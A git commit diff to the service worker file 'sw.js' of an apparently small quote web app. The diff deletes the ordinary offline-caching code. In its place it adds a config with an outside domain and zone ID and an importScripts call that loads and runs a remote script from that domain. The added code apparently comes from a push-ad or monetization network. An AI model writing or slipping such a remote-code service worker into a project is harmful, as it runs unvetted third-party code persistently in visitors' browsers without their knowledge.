a753b18e81a964478004a41d42521141b155176b
epina4240-byte <epina4240@gmail.com>
2026-02-08 07:50:10 -0600

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,21 +1,6 @@
-const CACHE_NAME = 'quote-app-v1';
-const ASSETS = [
-    './',
-    './index.html',
-    './style.css',
-    './script.js'
-];
-
-self.addEventListener('install', (event) => {
-    event.waitUntil(
-        caches.open(CACHE_NAME)
-            .then((cache) => cache.addAll(ASSETS))
-    );
-});
-
-self.addEventListener('fetch', (event) => {
-    event.respondWith(
-        caches.match(event.request)
-            .then((response) => response || fetch(event.request))
-    );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10585433
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
